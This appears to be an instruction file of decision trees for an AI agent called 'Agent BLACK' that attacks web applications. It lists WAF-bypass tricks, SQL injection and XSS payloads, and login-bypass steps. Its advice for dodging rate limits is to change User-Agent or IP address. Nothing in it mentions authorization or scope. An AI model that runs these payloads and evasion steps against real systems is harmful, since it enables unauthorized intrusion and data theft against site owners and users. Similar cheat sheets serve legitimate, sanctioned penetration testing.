# Agent BLACK Decision Trees

When facing common scenarios, follow these specific decision paths.

## WAF Detected

```
1. Identify WAF type (Cloudflare, ModSecurity, AWS WAF, etc.)
2. Try case manipulation: SeLeCt instead of SELECT
3. Try comment injection: SEL/**/ECT
4. Try encoding: %53%45%4c%45%43%54
5. Try whitespace alternatives: SELECT%09* (tab instead of space)
6. Try alternative syntax: UNION ALL SELECT vs UNION SELECT
7. If all fail: Note WAF type in lessons_learned for future reference
```

## SQL Injection Not Working

```
1. Check if parameter is actually used in query (try adding ')
2. Try different quote types: ' vs " vs `
3. Try numeric injection (no quotes): 1 OR 1=1
4. Try time-based blind: ' AND SLEEP(5)--
5. Try boolean-based blind: ' AND 1=1-- vs ' AND 1=2--
6. Try different comment styles: -- vs # vs /**/
7. Try stacked queries: ; SELECT * FROM users--
8. Check for second-order injection points
```

## XSS Payload Blocked

```
1. Try different event handlers: onerror, onload, onfocus, onmouseover
2. Try without script tags: <img src=x onerror=alert(1)>
3. Try SVG: <svg onload=alert(1)>
4. Try encoding: &#x3c;script&#x3e;
5. Try breaking out of attribute: " onclick="alert(1)
6. Try template literals: ${alert(1)}
7. Try DOM-based vectors if reflected XSS fails
```

## Target Not Responding

```
1. Verify target is up: ping/curl
2. Check if being rate limited: wait and retry
3. Try different User-Agent
4. Try from different IP if possible
5. Check if specific endpoint is down vs whole target
6. Reduce thread count and retry
```

## Authentication Required

```
1. Check for default credentials
2. Look for registration endpoint
3. Check for password reset flaws
4. Try authentication bypass (SQLi in login)
5. Check for JWT weaknesses if token-based
6. Look for IDOR in authenticated endpoints
```

## Nothing Found After Full Scan

```
1. Run with --aggressive flag for more payloads
2. Try different parameter discovery (paramfind module)
3. Check JavaScript files for hidden endpoints
4. Run subdomain enumeration
5. Check for API endpoints (/api/, /v1/, /graphql)
6. Try different content types (JSON, XML)
7. Look for backup files (.bak, .old, ~)
```

## High False Positive Rate

```
1. Check confidence scores - focus on CONFIRMED and HIGH only
2. Manually verify top findings
3. Look for patterns in false positives
4. Adjust scan to exclude known false positive patterns
5. Use --verify flag for additional confirmation
```

## Exploit Not Working

```
1. Verify vulnerability still exists (re-scan)
2. Check if payload needs adjustment for target
3. Try alternative exploitation method
4. Check for additional protections (CSRF tokens, etc.)
5. Look for privilege requirements
6. Document failure in lessons_learned
```
